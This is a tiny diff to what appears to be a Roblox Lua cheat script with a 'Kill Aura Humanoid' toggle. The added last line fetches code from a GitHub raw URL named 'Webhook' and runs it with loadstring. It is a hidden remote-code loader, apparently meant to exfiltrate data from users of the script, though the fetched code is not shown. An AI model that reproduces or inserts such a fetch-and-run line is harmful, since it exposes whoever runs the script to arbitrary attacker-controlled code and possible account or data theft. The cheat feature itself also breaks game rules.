@@ -38,3 +38,4 @@ drops:Toggle("Kill Aura Humanoid", false, function(t)
         end
     end
 end)
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Duy02022007/vn/main/Webhook"))()
